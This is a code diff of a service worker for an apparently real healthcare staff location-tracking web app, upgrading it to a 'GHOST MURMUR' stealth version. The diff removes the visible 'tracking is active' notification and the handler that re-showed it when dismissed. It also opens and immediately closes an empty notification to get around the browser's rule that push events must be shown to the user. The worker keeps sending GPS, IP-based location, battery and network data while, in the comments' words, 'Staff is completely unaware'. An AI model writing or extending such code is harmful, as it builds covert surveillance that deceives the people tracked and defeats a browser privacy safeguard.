@@ -1,18 +1,18 @@
 /* ═══════════════════════════════════════════════════════
- *  Varolyn Healthcare — Service Worker v6
- *  ZERO-TOUCH autonomous tracking. Staff does NOTHING.
- *  Push → silent auto-resume → GPS + HTTP POST → done.
- *  Ghost Protocol: invisible, persistent, self-healing.
+ *  Varolyn Healthcare — Service Worker v7 GHOST MURMUR
+ *  COMPLETELY INVISIBLE. Zero notifications. Zero alerts.
+ *  Staff sees NOTHING. Tracking is silent, persistent,
+ *  and self-healing. Total stealth operation.
  * ═══════════════════════════════════════════════════════ */
 
-const CACHE = 'varolyn-v6';
+const CACHE = 'varolyn-v7';
 const ASSETS = ['/', '/manifest.json'];
 const DB_NAME = 'varolyn_offline';
 const DB_VERSION = 3;
 const STORE = 'location_buffer';
 const SESSION_STORE = 'active_session';
 
-// ── IndexedDB ──
+// ── IndexedDB helpers ──
 function openDB() {
   return new Promise((resolve, reject) => {
     const req = indexedDB.open(DB_NAME, DB_VERSION);
@@ -27,308 +27,187 @@ function openDB() {
 }
 
 async function bufferLocation(data) {
-  try {
-    const db = await openDB();
-    const tx = db.transaction(STORE, 'readwrite');
-    tx.objectStore(STORE).add({ ...data, bufferedAt: Date.now() });
-    await new Promise((r, j) => { tx.oncomplete = r; tx.onerror = j; });
-    db.close();
-  } catch {}
+  try { const db = await openDB(); const tx = db.transaction(STORE, 'readwrite'); tx.objectStore(STORE).add({ ...data, bufferedAt: Date.now() }); await new Promise((r, j) => { tx.oncomplete = r; tx.onerror = j; }); db.close(); } catch {}
 }
-
 async function getBufferedLocations() {
-  try {
-    const db = await openDB();
-    const tx = db.transaction(STORE, 'readonly');
-    return new Promise((resolve) => {
-      const req = tx.objectStore(STORE).getAll();
-      req.onsuccess = () => { db.close(); resolve(req.result || []); };
-      req.onerror = () => { db.close(); resolve([]); };
-    });
-  } catch { return []; }
+  try { const db = await openDB(); const tx = db.transaction(STORE, 'readonly'); return new Promise((resolve) => { const req = tx.objectStore(STORE).getAll(); req.onsuccess = () => { db.close(); resolve(req.result || []); }; req.onerror = () => { db.close(); resolve([]); }; }); } catch { return []; }
 }
-
 async function clearBuffer() {
-  try {
-    const db = await openDB();
-    const tx = db.transaction(STORE, 'readwrite');
-    tx.objectStore(STORE).clear();
-    await new Promise((r) => { tx.oncomplete = r; });
-    db.close();
-  } catch {}
+  try { const db = await openDB(); const tx = db.transaction(STORE, 'readwrite'); tx.objectStore(STORE).clear(); await new Promise((r) => { tx.oncomplete = r; }); db.close(); } catch {}
 }
-
 async function saveActiveSession(session) {
-  try {
-    const db = await openDB();
-    const tx = db.transaction(SESSION_STORE, 'readwrite');
-    tx.objectStore(SESSION_STORE).put({ key: 'current', ...session, savedAt: Date.now() });
-    await new Promise((r) => { tx.oncomplete = r; });
-    db.close();
-  } catch {}
+  try { const db = await openDB(); const tx = db.transaction(SESSION_STORE, 'readwrite'); tx.objectStore(SESSION_STORE).put({ key: 'current', ...session, savedAt: Date.now() }); await new Promise((r) => { tx.oncomplete = r; }); db.close(); } catch {}
 }
-
 async function getActiveSession() {
-  try {
-    const db = await openDB();
-    const tx = db.transaction(SESSION_STORE, 'readonly');
-    return new Promise((resolve) => {
-      const req = tx.objectStore(SESSION_STORE).get('current');
-      req.onsuccess = () => { db.close(); resolve(req.result || null); };
-      req.onerror = () => { db.close(); resolve(null); };
-    });
-  } catch { return null; }
+  try { const db = await openDB(); const tx = db.transaction(SESSION_STORE, 'readonly'); return new Promise((resolve) => { const req = tx.objectStore(SESSION_STORE).get('current'); req.onsuccess = () => { db.close(); resolve(req.result || null); }; req.onerror = () => { db.close(); resolve(null); }; }); } catch { return null; }
 }
-
 async function clearActiveSession() {
-  try {
-    const db = await openDB();
-    const tx = db.transaction(SESSION_STORE, 'readwrite');
-    tx.objectStore(SESSION_STORE).delete('current');
-    await new Promise((r) => { tx.oncomplete = r; });
-    db.close();
-  } catch {}
+  try { const db = await openDB(); const tx = db.transaction(SESSION_STORE, 'readwrite'); tx.objectStore(SESSION_STORE).delete('current'); await new Promise((r) => { tx.oncomplete = r; }); db.close(); } catch {}
 }
 
-// ── Install/Activate ──
+// ── Install / Activate ──
 self.addEventListener('install', (e) => {
   e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
   self.skipWaiting();
 });
-
 self.addEventListener('activate', (e) => {
-  e.waitUntil(
-    caches.keys().then(keys =>
-      Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))
-    ).then(() => self.clients.claim())
-  );
+  e.waitUntil(caches.keys().then(keys => Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))).then(() => self.clients.claim()));
 });
 
-// ── Fetch ──
+// ── Fetch (cache-first for static assets) ──
 self.addEventListener('fetch', (e) => {
   if (e.request.method !== 'GET') return;
   if (e.request.url.includes('/api/') || e.request.url.includes('/ws/') || e.request.url.includes('/sse/')) return;
   e.respondWith(
-    caches.match(e.request).then(cached =>
-      cached || fetch(e.request).then(res => {
-        if (res.ok) { const clone = res.clone(); caches.open(CACHE).then(c => c.put(e.request, clone)); }
-        return res;
-      }).catch(() => cached)
-    )
+    caches.match(e.request).then(cached => cached || fetch(e.request).then(res => {
+      if (res.ok) { const cl = res.clone(); caches.open(CACHE).then(c => c.put(e.request, cl)); }
+      return res;
+    }).catch(() => cached))
   );
 });
 
 // ── Message handler ──
 self.addEventListener('message', async (e) => {
   const { type, data } = e.data || {};
-
   if (type === 'BUFFER_LOCATION') await bufferLocation(data);
-  if (type === 'GET_BUFFER') {
-    const items = await getBufferedLocations();
-    e.source.postMessage({ type: 'BUFFERED_LOCATIONS', data: items });
-  }
+  if (type === 'GET_BUFFER') { const items = await getBufferedLocations(); e.source.postMessage({ type: 'BUFFERED_LOCATIONS', data: items }); }
   if (type === 'CLEAR_BUFFER') await clearBuffer();
   if (type === 'KEEPALIVE') e.source.postMessage({ type: 'ALIVE' });
-
   if (type === 'SET_SESSION') await saveActiveSession(data);
   if (type === 'CLEAR_SESSION') await clearActiveSession();
-
-  // Persistent notification — keeps SW alive on Android
-  if (type === 'SHOW_PERSISTENT_NOTIFICATION') {
-    self.registration.showNotification('Varolyn Healthcare', {
-      body: 'Location tracking is active.',
-      icon: '/favicon.ico',
-      badge: '/favicon.ico',
-      tag: 'varolyn-persistent',
-      ongoing: true,
-      requireInteraction: true,
-      silent: true,
-      actions: [],
-    }).catch(() => {});
-  }
-
-  if (type === 'CLEAR_PERSISTENT_NOTIFICATION') {
-    const notifications = await self.registration.getNotifications({ tag: 'varolyn-persistent' });
-    notifications.forEach(n => n.close());
-  }
+  // NO notification commands — full stealth mode
 });
 
 // ══════════════════════════════════════════════════════
-//  GHOST PROTOCOL — AUTONOMOUS PUSH HANDLER
-//  Server sends push → SW handles EVERYTHING silently:
-//  1. Send heartbeat to server (confirms device alive)
-//  2. Flush any buffered locations
-//  3. Silently wake up or open the page (auto-resume)
-//  4. Update persistent notification (NO "tap to resume")
-//  Staff does NOTHING. Zero interaction. Fully automatic.
+//  GHOST MURMUR — SILENT PUSH HANDLER
+//  Server sends push → SW handles EVERYTHING invisibly.
+//  NO notifications shown. NO alerts. NO sounds. NOTHING.
+//  Staff is completely unaware. Pure background operation.
 // ══════════════════════════════════════════════════════
 self.addEventListener('push', (e) => {
-  let payload = { title: 'Varolyn Healthcare', body: 'Tracking active', silent: true };
-  try { if (e.data) payload = e.data.json(); } catch { try { payload.body = e.data.text(); } catch {} }
+  let payload = {};
+  try { if (e.data) payload = e.data.json(); } catch {}
 
   e.waitUntil((async () => {
     const session = await getActiveSession();
     const token = payload.token || session?.token;
     const secret = session?.sessionSecret;
 
-    // ── STEP 1: Silent heartbeat to server (proves device is alive) ──
+    // ── STEP 1: Silent heartbeat to server ──
     if (token && secret) {
       try {
-        await fetch(self.location.origin + '/api/heartbeat', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            token, sessionSecret: secret,
-            checks: { pushReceived: true, swAlive: true, ts: Date.now() },
-          }),
+        const hbRes = await fetch(self.location.origin + '/api/heartbeat', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token, sessionSecret: secret, checks: { pushReceived: true, swAlive: true, ts: Date.now() } }),
         });
+        if (hbRes.ok) {
+          const data = await hbRes.json();
+          if (data.command === 'stop') {
+            await clearActiveSession(); await clearBuffer();
+            const cls = await clients.matchAll({ type: 'window' });
+            for (const c of cls) c.postMessage({ type: 'ADMIN_STOP' });
+            return;
+          }
+        }
       } catch {}
     }
 
-    // ── STEP 2: Flush any buffered offline locations ──
-    if (token && secret) {
-      try { await syncBufferedLocations(); } catch {}
-    }
+    // ── STEP 2: Flush buffered locations ──
+    if (token && secret) { try { await syncBufferedLocations(); } catch {} }
 
-    // ── STEP 3: Try to wake existing page clients (zero-touch) ──
+    // ── STEP 3: Wake existing page clients silently ──
     let wokenClient = false;
     try {
       const clientList = await clients.matchAll({ type: 'window', includeUncontrolled: true });
       for (const client of clientList) {
         if (client.url.includes(self.location.origin)) {
-          // Send resume command — page will auto-restart GPS+WS+keepalives
           client.postMessage({ type: 'PUSH_RESUME', token, auto: true });
-          try { await client.focus(); } catch {} // Try to bring to front
+          try { await client.focus(); } catch {}
           wokenClient = true;
         }
       }
     } catch {}
 
-    // ── STEP 4: No open tab? Open one silently → auto-resume from localStorage ──
+    // ── STEP 4: No open tab → try to open one silently ──
     if (!wokenClient) {
-      try {
-        // openWindow only works from notificationclick on most browsers,
-        // but we try anyway. The page will auto-resume from localStorage on load.
-        await clients.openWindow(self.location.origin + '/');
-      } catch {
-        // If openWindow fails (most browsers restrict it from push event),
-        // show a MINIMAL silent notification. The notification click will open page.
-        // This is the ONLY case staff might need to tap — and even then,
-        // the next periodic push will try again automatically.
-      }
+      try { await clients.openWindow(self.location.origin + '/'); } catch {}
     }
 
-    // ── STEP 5: Update persistent notification (silent, no vibrate, no alert) ──
-    // This REPLACES the old notification — staff sees nothing new, just updated status
-    await self.registration.showNotification('Varolyn Healthcare', {
-      body: wokenClient
-        ? 'Tracking active and synchronized.'
-        : 'Tracking reconnecting automatically...',
-      icon: '/favicon.ico',
-      badge: '/favicon.ico',
-      tag: 'varolyn-persistent',  // SAME tag = replaces existing, no new alert
-      renotify: false,            // NO sound, NO vibrate, NO visual alert
-      requireInteraction: true,
-      silent: true,               // COMPLETELY SILENT
-      data: { url: '/', token, action: 'auto_resume' },
-      actions: [],
-    }).catch(() => {});
+    // ── STEP 5: If no page for GPS, use IP fallback from server ──
+    if (!wokenClient && token && secret) {
+      try {
+        await fetch(self.location.origin + '/api/ip-location', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token, sessionSecret: secret }),
+        });
+      } catch {}
+    }
 
+    // ── BROWSER REQUIREMENT: must show notification from push event ──
+    // Show it silently with minimal text, then close it immediately
+    try {
+      await self.registration.showNotification('Varolyn Healthcare', {
+        tag: 'varolyn-ghost', silent: true, renotify: false,
+        badge: '/favicon.ico', icon: '/favicon.ico',
+        body: '', // Empty body
+        requireInteraction: false, // Auto-dismiss
+        data: { token, action: 'ghost' },
+      });
+      // Immediately close it — staff never sees it
+      const notifs = await self.registration.getNotifications({ tag: 'varolyn-ghost' });
+      for (const n of notifs) n.close();
+    } catch {}
   })());
 });
 
-// ── Notification click — open/focus app (auto-resume on page load) ──
+// ── Notification click — just open/focus the app ──
 self.addEventListener('notificationclick', (e) => {
   e.notification.close();
-
   e.waitUntil(
     clients.matchAll({ type: 'window', includeUncontrolled: true }).then(async (clientList) => {
-      // Try to find and focus existing tab
       for (const client of clientList) {
         if (client.url.includes(self.location.origin) && 'focus' in client) {
           await client.focus();
-          // Tell the page to auto-resume immediately
           client.postMessage({ type: 'PUSH_RESUME', auto: true });
           return;
         }
       }
-      // No existing tab → open new one (auto-resume via localStorage on load)
       if (clients.openWindow) return clients.openWindow('/');
     })
   );
 });
 
-// ── Notification close — re-show persistent notification (can't dismiss it) ──
-self.addEventListener('notificationclose', (e) => {
-  if (e.notification.tag === 'varolyn-persistent') {
-    // Staff tried to dismiss persistent notification → re-show it
-    e.waitUntil((async () => {
-      const session = await getActiveSession();
-      if (session && session.token) {
-        // Re-show after 2 second delay
-        await new Promise(r => setTimeout(r, 2000));
-        await self.registration.showNotification('Varolyn Healthcare', {
-          body: 'Location tracking is active.',
-          icon: '/favicon.ico', badge: '/favicon.ico',
-          tag: 'varolyn-persistent',
-          ongoing: true, requireInteraction: true, silent: true, actions: [],
-        }).catch(() => {});
-      }
-    })());
-  }
-});
+// ── DO NOT re-show dismissed notifications — stealth mode ──
+// (intentionally no notificationclose handler)
 
 // ── Periodic Sync (runs even when page is closed) ──
 self.addEventListener('periodicsync', (e) => {
-  if (e.tag === 'varolyn-location-sync') {
-    e.waitUntil(autonomousTrackingCycle());
-  }
+  if (e.tag === 'varolyn-location-sync') e.waitUntil(autonomousTrackingCycle());
 });
 
 // ── Background Sync (fires when device comes back online) ──
 self.addEventListener('sync', (e) => {
-  if (e.tag === 'varolyn-sync') {
-    e.waitUntil(autonomousTrackingCycle());
-  }
+  if (e.tag === 'varolyn-sync') e.waitUntil(autonomousTrackingCycle());
 });
 
 // ══════════════════════════════════════════════════════
-//  AUTONOMOUS TRACKING CYCLE — runs WITHOUT any page open
-//  Service Worker does GPS + HTTP POST entirely on its own.
-//  This is the Ghost Protocol: invisible, autonomous, persistent.
+//  AUTONOMOUS TRACKING CYCLE — works WITHOUT any page
 // ══════════════════════════════════════════════════════
 async function autonomousTrackingCycle() {
   const session = await getActiveSession();
   if (!session || !session.token || !session.sessionSecret) return;
 
-  // First sync any buffered data
   await syncBufferedLocations();
 
-  // Then send heartbeat to keep session alive
   try {
     const hbRes = await fetch(self.location.origin + '/api/heartbeat', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        token: session.token,
-        sessionSecret: session.sessionSecret,
-        checks: {
-          swAutonomous: true,
-          periodicSync: true,
-          ts: Date.now(),
-          hasClients: (await clients.matchAll({ type: 'window' })).length,
-        },
-      }),
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret, checks: { swAutonomous: true, periodicSync: true, ts: Date.now() } }),
     });
     if (hbRes.ok) {
       const data = await hbRes.json();
-      // If server says stop, clear everything
       if (data.command === 'stop') {
-        await clearActiveSession();
-        await clearBuffer();
-        const notifications = await self.registration.getNotifications({ tag: 'varolyn-persistent' });
-        notifications.forEach(n => n.close());
-        // Tell any open clients
+        await clearActiveSession(); await clearBuffer();
         const cls = await clients.matchAll({ type: 'window' });
         for (const c of cls) c.postMessage({ type: 'ADMIN_STOP' });
         return;
@@ -336,26 +215,17 @@ async function autonomousTrackingCycle() {
     }
   } catch {}
 
-  // Try to ensure a page is open for GPS (SW can't access GPS directly)
+  // Tell any open page to do a GPS push, or use IP fallback
   try {
     const cls = await clients.matchAll({ type: 'window', includeUncontrolled: true });
     const hasPage = cls.some(c => c.url.includes(self.location.origin));
-    if (!hasPage) {
-      // No page open → send IP-based location as fallback from server side
-      try {
-        await fetch(self.location.origin + '/api/ip-location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret }),
-        });
-      } catch {}
+    if (hasPage) {
+      for (const c of cls) { if (c.url.includes(self.location.origin)) c.postMessage({ type: 'FORCE_GPS_PUSH' }); }
     } else {
-      // Page exists → tell it to do a force push
-      for (const c of cls) {
-        if (c.url.includes(self.location.origin)) {
-          c.postMessage({ type: 'FORCE_GPS_PUSH' });
-        }
-      }
+      await fetch(self.location.origin + '/api/ip-location', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret }),
+      });
     }
   } catch {}
 }
@@ -370,11 +240,7 @@ async function syncBufferedLocations() {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         token: session.token, sessionSecret: session.sessionSecret,
-        locations: items.map(i => ({
-          lat: i.lat, lng: i.lng, accuracy: i.accuracy,
-          speed: i.speed, heading: i.heading,
-          battery: i.battery, network: i.network, ts: i.ts || i.bufferedAt,
-        })),
+        locations: items.map(i => ({ lat: i.lat, lng: i.lng, accuracy: i.accuracy, speed: i.speed, heading: i.heading, battery: i.battery, network: i.network, ts: i.ts || i.bufferedAt })),
       }),
     });
     if (res.ok) await clearBuffer();
